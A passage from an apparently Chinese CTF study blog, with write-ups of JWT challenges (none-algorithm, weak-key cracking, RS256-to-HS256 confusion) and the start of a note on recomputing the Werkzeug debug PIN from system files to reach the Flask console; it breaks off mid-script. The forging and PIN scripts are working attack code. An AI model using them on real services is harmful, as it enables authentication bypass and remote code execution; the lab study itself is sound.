<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJBRyI6IjI1NGEwYzcyNzY2YWM4N30iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJGTCI6ImN0Zmh1Yns2YTAwYTMxMzAifQ.uPFtXGkmPcxJiivPldw_Ek93HwLeem9VDO1vwJZO0HY</span><br></pre></td></tr></table></figure>

<p>拿去解码得到</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420162816882.png" alt="image-20240420162816882"></p>
<p>最终flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;6a00a3130254a0c72766ac87&#125;</span><br></pre></td></tr></table></figure>



<h6 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h6><p>题目描述：</p>
<p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。</p>
<p>————</p>
<p>打开后还是登录，登录成功后可以看到<code>Hello 1(guest), only admin can get flag.</code>,应该就是要伪造admin，抓包看看，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.2Y5_56UX1H_28WxpkOq3eZ6AB-JeyLH-mXwimgwhew8</span><br></pre></td></tr></table></figure>

<p>拿去解密，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要将role改为admin</p>
<p>结合题目描述直接使用脚本签名为none的jwt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;&quot;</span>, <span class="comment"># 密钥，此处置为空</span></span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, <span class="comment"># 加密方式</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>

<p>生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.</span><br></pre></td></tr></table></figure>

<p>再次<strong>在当前目录(index.php)发包</strong>，成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420164328912.png" alt="image-20240420164328912"></p>
<p>flag如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;158cb73238f8b1378e1a6fe8&#125;</span><br></pre></td></tr></table></figure>

<h6 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h6><p>题目描述:<br>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。尝试获取flag</p>
<p>————</p>
<p>第一次登录后显示<code>Hello 1(guest), only admin can get flag.</code></p>
<p>再次刷新获取资源，此时就会携带jwt向服务器发送请求，抓包获取得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.NHdRZ0DlkPjGsxP_ApUMag_hbFoqOZIbpwuNaa9PSYg</span><br></pre></td></tr></table></figure>

<p>解码得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接用工具爆破</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420165241660.png" alt="image-20240420165241660"></p>
<p>得到密钥为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eslu</span><br></pre></td></tr></table></figure>

<p>再在<a href="https://jwt.io/#encoded-jwt">jwt.io</a>伪造jwt即可</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420165338094.png" alt="image-20240420165338094"></p>
<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.dAS6XdJSP08cxTDGETnLjsrCduMn12gimm5s0dhwFC8</span><br></pre></td></tr></table></figure>

<p>再次在获取资源页面发包</p>
<p>成功得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;2afa10ab9a76e138e01604a4&#125;</span><br></pre></td></tr></table></figure>



<h6 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h6><p>题目描述:<br>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。</p>
<p>————</p>
<p>打开题目给了源码，稍微审计一下源码，给了公钥地址，直接访问<code>/publickey.pem</code>，得到公钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs2Zu6nNtgFv8Y3VRd4gm</span><br><span class="line">Wvqd+fkAvvBcve+1VIDpLCFSwBB9tz894Dt8c5RiU3bzSfCWFlhHYh7gWOP1Tvfc</span><br><span class="line">DNcmFkye4ce+ccnrrAE/nasF7OXoK2sZjgWdcjuT1n5MobKsD+DjJdlY0J4aZ+PS</span><br><span class="line">yjrK3UReEN5HEAnKG8H23eyKU5y8FOUjiF0s1YE7E1q4gZ14lCPCdyUfgNjje592</span><br><span class="line">lgOHhiRRxkPpg/jUYNtTNAJVsS1UBNw+06Dk5TharBklC4N9z47nkbSM90KDBe/K</span><br><span class="line">+nyPeqTqzvzCvY8WY/ml7lenkkvS38TkKI5Snu8H3a5ZNOCBdCYF1X8OFymtX85J</span><br><span class="line">zQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>

<p>直接登录，返回了一串字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.E5u_xfY9UrHQd1XBHKHKzgtw5kta7NhkbLmJnRXU_vQJphtf3BPonDwc1L3d8kZUG8JloGNQwVTy4xg6dgIZaCJPpl0m3tiizBEY9LOp33Avt7ZMGUXfo3P5z-VSr7uIVXm9b_z6R8OD5jy_Z3k_yoblzAxRSCoR5a8wGWVdKeIEQTFX7kfO4uOJ-zQinFvIK9ipki6_3-rXuyLOnx-CFAqaSKJ6wfPqSGTuKzatCs3HNcp4TI3f5M0_Qmn09kbzvlTMdQsVg5k45LceMGD38QdtaW4zOcIiPIuKp90rtYo3r12KMklJ0J11SZnsTdCPk6lsB925wK6H6sPy45Jr9Q </span><br></pre></td></tr></table></figure>

<p>应该是返回的jwt，拿去解密看看。得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要将算法和role修改，直接使用脚本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz6rR8Hafw5UZquuWnmBO</span><br><span class="line">x0cqkv5UFmuhra0dbtI92yV2pvvSJo/157cn//rXm5C5t0jkYFNjy+YSKk0Pv9sD</span><br><span class="line">YtGB2BjE9bHyV7wroZ82V8a6YWaerPcOK3Jp2kPn1tUp93I0yGeNLZCFD0bOoIXJ</span><br><span class="line">8RixwtFVHjbRNu7f1x0BTpg51JfI5/r4HAbkjyako2JuVFMF77Kj9DdkWg+SfvYA</span><br><span class="line">IF/5Az5/0pjZT90CwgvMAuB6eLJ7b7XhGdLX9ttTgDpFzLIeCPNIK0PhF2qNMx0/</span><br><span class="line">XllkqXk4fPEPW/BaCfw6rasqsq3a+lSiLcb2QMHRJ39nQ12KiPb/m8AoILOulA3G</span><br><span class="line">pwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">header = &#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span><br><span class="line">payload = &#x27;&#123;&quot;username&quot;: &quot;root&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(&quot;utf-8&quot;))</span><br><span class="line">encodeHeader = str(encodeHBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line"></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(&quot;utf-8&quot;))</span><br><span class="line">encodePayload = str(encodePBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line"></span><br><span class="line">token = (encodeHeader + &quot;.&quot; + encodePayload)</span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(bytes(key, &quot;UTF-8&quot;), token.encode(&quot;utf-8&quot;), hashlib.sha256).digest()).decode(&quot;UTF-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line">print(token + &quot;.&quot; + sig)</span><br></pre></td></tr></table></figure>

<p>生成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJyb290IiwgInJvbGUiOiAiYWRtaW4ifQ.ga1VAIojVGWB2b70fAN2OkBv0I6xCqBFtSj5KJvfiKk</span><br></pre></td></tr></table></figure>

<p>抓回包在获取资源的GET页面伪造token，再放包成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420175625851.png" alt="image-20240420175625851"></p>
<p>flag如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;6ec9f26fdf733354f0c75c4c&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结:<strong>都是在获取资源页面（一般都是GET请求）伪造token来获取其他资源</strong>，需要注意。</strong></p>
<h5 id="polarctf"><a href="#polarctf" class="headerlink" title="polarctf"></a>polarctf</h5><h6 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h6><p>打开即是注册登录界面，如实操作后并没有flag，</p>
<p>然后在抓包界面看到如下jwt:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8SGkFhdaEt0zvByKBtz1oO8ikAFCDHblv1iPowur7e0</span><br></pre></td></tr></table></figure>

<p>拿去网站解密一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>尝试爆破密钥</strong>，这里使用**<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>**工具爆破密钥，成功得到密钥为<code>SYSA</code>：<br><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240418205910130.png" alt="image-20240418205910130"></p>
<p>再通过jwt.io修改username为admin来伪造jwt</p>
<p>抓包修改username为admin，成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240419194521275.png" alt="image-20240419194521275"></p>
<p>成功得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ec39c705cfb5295f9dddcedc819a1659&#125;</span><br></pre></td></tr></table></figure>



<p><strong>总结</strong>：还是要有敏感性，为什么刚好Jwt那里只有username，为而刚好对应不能将敏感信息写入jwt，这是就应该联想到flag在密码或者邮箱，继续学习。</p>
<p>其他参考：</p>
<p>2022祥云杯 - FunWEB</p>
<p>NewstarCTF 2023 - Ye’s Pickle</p>
]]></content>
      <categories>
        <category>jwt</category>
      </categories>
  </entry>
  <entry>
    <title>Python Debug PIN码的利用及做题笔记</title>
    <url>/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>利用pin码可以在报错界面执行任意python代码</p>
<span id="more"></span>

<p><strong>先了解一下debug是什么</strong>：debug是由bug词得来的，bug就是程序故障。debug就是排除程序故障的意思。</p>
<p>而解决程序故障通常都是通过工具（即debug调试器）来对代码进行调试，一步步找出程序中出现bug的位置。</p>
<p><a href="https://zhuanlan.zhihu.com/p/62610785">参考文章</a></p>
<h3 id="PIN码的利用"><a href="#PIN码的利用" class="headerlink" title="PIN码的利用"></a>PIN码的利用</h3><h4 id="PIN是什么"><a href="#PIN是什么" class="headerlink" title="PIN是什么"></a>PIN是什么</h4><p><strong>PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。 您可以使用浏览器中的调试器引脚来启动交互式调试器。</strong><br>引用<br>请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。<br>引用<br>调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。</p>
<p><strong>werkzeug不同版本</strong>以及python不同版本都会影响PIN码的生成</p>
<p>但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法</p>
<h4 id="pin码的生成算法"><a href="#pin码的生成算法" class="headerlink" title="pin码的生成算法"></a>pin码的生成算法</h4><p>一个简单的flask测试程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;haha&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这是一个基本的使用flask框架创建web应用的示例，解析一下这串代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask: 这行代码导入了 Flask 框架，使我们可以在代码中使用 Flask 的功能。</span><br><span class="line"></span><br><span class="line">app = Flask(__name__): 这行代码创建了一个应用对象 app，它是 Flask 类的一个实例。__name__ 参数是用来确定应用的根目录，通常是 Python 模块的名称。这样做是为了告诉 Flask 在哪里寻找模板、静态文件等。</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;): 这是一个装饰器，用于告诉 Flask 应用如何响应来自根 URL（&quot;/&quot;）的请求。在这个例子中，根 URL 的请求会被传递到 hello() 函数进行处理。</span><br><span class="line"></span><br><span class="line">def hello(): 这是一个视图函数，用于处理根 URL 的请求。视图函数负责处理请求并返回响应。</span><br><span class="line"></span><br><span class="line">return &#x27;haha&#x27; :一个简单的字符串作为 HTTP 响应的主体内容。</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;: :这是 Python 中的一个惯用法，用于检查当前模块是否被直接运行。如果是，则执行下面的代码块。</span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;, port=8080, debug=True): 这行代码启动了 Flask 应用的开发服务器。host=&quot;0.0.0.0&quot; 参数指定了服务器监听所有公共 IP 地址，port=8080 参数指定了服务器监听的端口号，debug=True 参数启用了调试模式，这样在代码发生变化时，服务器会自动重启以加载最新的代码。</span><br></pre></td></tr></table></figure>

<p>运行后就会在控制台看到PIN码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> * Serving Flask app <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> * Debug mode: on</span><br><span class="line">WARNING: This <span class="keyword">is</span> a development server. Do <span class="keyword">not</span> use it <span class="keyword">in</span> a production deployment. Use a production WSGI server instead.</span><br><span class="line"> * Running on <span class="built_in">all</span> addresses (<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>)</span><br><span class="line"> * Running on http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span></span><br><span class="line"> * Running on http://<span class="number">192.168</span><span class="number">.173</span><span class="number">.123</span>:<span class="number">8080</span></span><br><span class="line">Press CTRL+C to quit</span><br><span class="line"> * Restarting <span class="keyword">with</span> stat</span><br><span class="line"> * Debugger <span class="keyword">is</span> active!</span><br><span class="line"> * Debugger PIN: xxx-xxx-xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而在源代码中PIN码生成的具体代码跟进参考<a href="https://xz.aliyun.com/t/8092?time__1311=n4+xuDgDBADQYiKP40HwbDyiDcDjr2qGIKNUQYx&alichlgref=https://www.google.com.hk/">文章</a></p>
<p>PIN码一般都是固定的，只要掌握了下面几个元素，就可以利用脚本生成PIN码</p>
<p>PIN码生成要素：</p>
<p>利用PIN值的关键代码在<code>Lib\site-packages\werkzeug\debug\__init__.py</code>,可以查看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">第一部分</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,  <span class="comment">#服务器运行flask所登录的用户名，username。</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># appname</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment">#flask库下app.py的绝对路径</span></span><br><span class="line">]</span><br><span class="line">username：通过getpass.getuser()读取，通过文件读取/etc/passwd，可能为root，到时候具体看，不行就每个用户名都试试</span><br><span class="line">modname：通过<span class="built_in">getattr</span>(mod,“file”,<span class="literal">None</span>)读取，默认值为flask.app</span><br><span class="line">appname：通过<span class="built_in">getattr</span>(app, <span class="string">&#x27;__name__&#x27;</span>, <span class="built_in">getattr</span>(app.__class__, <span class="string">&#x27;__name__&#x27;</span>))读取，默认值为Flask</span><br><span class="line">第四个参数：<span class="built_in">getattr</span>(mod, <span class="string">&#x27;__file__&#x27;</span>, <span class="literal">None</span>),或通过报错得到，但是需要注意的是，python3是app.py，python2是app.pyc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二部分</span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>, <span class="comment">#当前网络的mac地址的十进制数 &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;#机器的id</span></span><br><span class="line">]</span><br><span class="line">十进制数的原始数的获得其中可以在/sys/<span class="keyword">class</span>/net/eth0/address 获取(eth0为网卡名)</span><br><span class="line"></span><br><span class="line">对于非docker机每一个机器都会有自已唯一的<span class="built_in">id</span>：</span><br><span class="line">machine_id由三个合并（docker就后两个）：</span><br><span class="line"><span class="number">1.</span> /etc/machine-<span class="built_in">id</span>（docker环境下不用读这个，直接拼接后面两个即可）</span><br><span class="line"><span class="number">2.</span>/proc/sys/kernel/random/boot_id（有boot-<span class="built_in">id</span>那就拼接boot-<span class="built_in">id</span>）</span><br><span class="line"><span class="number">3.</span>/proc/self/cgroup（截取最后一个斜杠后面的内容）</span><br><span class="line"><span class="comment"># 例如：name=systemd:/docker/2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8</span></span><br><span class="line"><span class="comment"># 则只截取2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8拼接到后面</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于文件里的mac地址一般为十六进制并且有<code>:</code>分别，可以使用如下脚本直接生成十进制的数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义原始的十六进制字符串，其中包含冒号</span></span><br><span class="line">a = <span class="string">&quot;a2:89:2e:1f:6a:8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用replace函数移除字符串中的所有冒号</span></span><br><span class="line">b = a.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用int函数将十六进制字符串转换为十进制整数</span></span><br><span class="line"><span class="comment"># int函数的第一个参数是要转换的字符串</span></span><br><span class="line"><span class="comment"># 第二个参数是字符串的进制，这里为16表示十六进制</span></span><br><span class="line">resault = <span class="built_in">int</span>(b, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印出转换后的十进制数值</span></span><br><span class="line"><span class="built_in">print</span>(resault)</span><br></pre></td></tr></table></figure>

<p>获得pin码后，只要开启了debug模式，就可以访问调试模式下的特殊路由（&#x2F;console），即使没有设置过。</p>
<h4 id="不同版本算法区别"><a href="#不同版本算法区别" class="headerlink" title="不同版本算法区别"></a>不同版本算法区别</h4><p>3.6采用MD5加密，3.8采用sha1加密，现在基本高版本，所以脚本有所不同</p>
<p><strong>3.6 MD5</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span> <span class="comment">#读/etc/passwd</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span><span class="comment">#报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p><strong>3.8 SHA1</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), 